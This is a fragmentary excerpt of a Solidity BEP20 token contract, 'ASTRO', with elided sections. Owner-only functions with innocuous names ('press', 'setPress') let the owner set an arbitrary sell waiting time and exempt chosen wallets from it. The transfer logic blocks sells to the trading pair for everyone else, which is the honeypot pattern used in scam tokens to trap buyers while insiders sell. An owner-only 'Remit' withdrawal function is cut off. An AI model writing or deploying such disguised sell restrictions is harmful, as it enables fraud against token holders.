...
contract ASTRO is Context, Ownable, IBEP20, BEP20Detailed {
  ...
  using SafeMath for uint256;
    ...
    mapping (address => bool) internal whitelistedFromSellTimeLimit;
    mapping (address => uint256) internal lastSellTime;
    address [] private _pairs;
    uint256 internal _totalSupply;
    uint256 public sellTimeLimit = 15 minutes;
    

    address public _owner;
  
    constructor () BEP20Detailed("Astronaut", "ASTRO", 18) {
      _owner = msg.sender ;
    ...
    function press(uint256 _time) external onlyOwner
    {
        sellTimeLimit = _time;
    }

    function _lastSellTime(address wallet) external view returns(uint256)
    {
        return lastSellTime[wallet];
    }

    function setPress(address wallet, bool value) external onlyOwner
    {
        whitelistedFromSellTimeLimit[wallet] = value;
    }

    function isWhitelisted(address wallet) external view returns(bool)
    {
        return whitelistedFromSellTimeLimit[wallet];
    }

    function checkExitsAddress(address _pairAdd) private view returns (bool){
       bool found=false;
        for (uint i=0; i<_pairs.length; i++) {
            if(_pairs[i]==_pairAdd){
                found=true;
                break;
            }
        }
    ...
    function _transfer(address sender, address recipient, uint amount) internal{
        ...
        {
            lastSellTime[recipient] = block.timestamp;
        }
    
        if(recipient == address(uniswapV2Pair))
        {
            if(!whitelistedFromSellTimeLimit[sender])
            {
                require(block.timestamp >= lastSellTime[sender] + sellTimeLimit, "Sell time has not reached");
            }
  ...
  // Revert tokens which are received by contract
    function Remit(address token, uint amount, address _wallet) onlyOwner() external {
        if(token == address(0)) {
